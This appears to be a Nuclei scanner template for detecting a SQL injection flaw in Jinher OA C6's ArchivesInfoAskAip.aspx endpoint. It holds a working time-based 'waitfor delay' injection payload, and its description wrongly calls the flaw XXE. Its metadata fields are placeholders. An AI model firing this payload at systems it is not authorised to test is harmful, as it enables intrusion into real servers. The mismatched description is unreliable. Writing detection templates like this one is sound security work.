id: jinher-oa-c6-ArchivesInfoAskAip-sqli
info:
  name: 金和OA ArchivesInfoAskAip.aspx SQL注入漏洞
  author: leadlife
  severity: high
  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 ArchivesInfoAskAip.aspx 接口处存在XXE漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/qvqgkmvd8g07t4o0
  classification:
    cve-id: 
  metadata:
    verified: true/false
    fofa-query: demo
    tips:
    repair:
    sqlmap:
    version:
  tags: sqli,jinher

http:
  - raw:  
      - |
        @timeout: 15s
        GET /c6/Jhsoft.Web.Archives/ArchivesInfoAskAip.aspx/?id=1'+waitfor+delay'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and